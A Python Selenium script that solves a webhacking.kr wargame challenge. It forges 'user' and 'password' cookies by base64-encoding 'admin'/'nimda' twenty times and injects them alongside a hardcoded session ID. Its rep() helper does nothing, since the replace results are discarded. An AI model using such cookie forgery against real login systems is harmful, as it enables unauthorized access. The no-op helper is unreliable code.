import base64

from selenium import webdriver

def rep(str):
    str.replace("!","1")
    str.replace("@","2")
    str.replace("$","3")
    str.replace("^","4")
    str.replace("&","5")
    str.replace("*","6")
    str.replace("(","7")
    str.replace(")","8")


def getflag(cookie=None):

    options = webdriver.ChromeOptions()
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    driver = webdriver.Chrome(executable_path='chromedriver', options=options)

    id = 'admin'.encode('utf-8')
    pw = 'nimda'.encode('utf-8')

    for i in range(0,20):
        id = base64.b64encode(id)
        pw = base64.b64encode(pw)

    rep(id.decode())
    rep(pw.decode())

    url = 'https://webhacking.kr/challenge/web-06/'
    driver.get(url=url)

    cooid={'name':'user', 'value':id.decode('utf8')}
    coopw={'name':'password', 'value':pw.decode('utf8')}

    driver.delete_all_cookies()
    driver.add_cookie(cookie)
    driver.add_cookie(cooid)
    driver.add_cookie(coopw)
    driver.refresh()

    try:
        al = driver.switch_to_alert()
        if 'already solved' in al.text:
            print('#06 PASS ')
        al.accept()
    except:
        print("ERROR NO.06")
    driver.close()





if __name__ == "__main__":
    coo = {'name':'PHPSESSID', 'value':'e8j3vm6uvuh4fqlgml274or3ek'}
    getflag(coo)